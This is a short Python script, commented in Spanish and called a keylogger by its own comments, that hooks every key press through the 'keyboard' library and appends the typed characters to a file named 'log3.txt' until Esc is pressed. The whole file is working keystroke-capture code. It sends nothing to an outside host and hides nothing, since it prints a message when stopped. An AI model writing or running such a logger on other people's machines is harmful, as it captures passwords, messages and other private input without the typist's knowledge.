import keyboard

# Variable para controlar si el keylogger está activo o no
running = True

# Función para escribir las pulsaciones en un archivo de registro
def on_press(event):
    global running
    with open("log3.txt", "a") as f:
        # Si se presiona la tecla "Espacio", se guarda un espacio en el archivo de registro
        if event.name == 'space':
            f.write(" ")
        # Si se presiona una tecla normal o con tilde, se guarda su valor en el archivo de registro
        elif len(event.name) == 1:
            f.write(event.name)
        # Si se presiona una tecla del teclado numérico, se guarda su valor en el archivo de registro
        elif event.name.startswith('numpad'):
            f.write(event.name[-1])
        # Si se presiona una tecla especial (Shift, Ctrl, etc.), no se hace nada en el archivo de registro
        elif event.name.startswith('shift') or event.name.startswith('ctrl') or event.name.startswith('alt'):
            pass
        # Si se presiona la tecla "Esc" para detener el keylogger
        elif event.name == 'esc':
            running = False
            print("Keylogger detenido")

# Agregar el evento de presionar tecla
keyboard.on_press(on_press)

# Mantener el programa en ejecución hasta que se presione "Esc"
while running:
    pass
